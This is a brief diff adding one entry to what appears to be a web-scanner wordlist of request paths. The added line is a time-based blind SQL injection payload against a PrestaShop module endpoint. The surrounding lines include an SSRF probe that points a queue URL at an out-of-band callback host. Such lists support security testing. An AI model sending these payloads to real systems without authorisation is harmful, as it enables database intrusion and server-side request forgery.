@@ -9851,3 +9851,4 @@ a
 /bypass/config?type=sqs&keyId=test&key=security&queueUrl=http://ctu1e2la6l84rsl142k0wwu93bqpzfsa5.oast.live/
 /2rGP8sVb34Enbc6nPm8WjXGmA8U
 /cgi-bin/cstecgi.cgi
+/modules/leocustomajax/leoajax.php?cat_list=(SELECT(0)FROM(SELECT(SLEEP(6)))a)
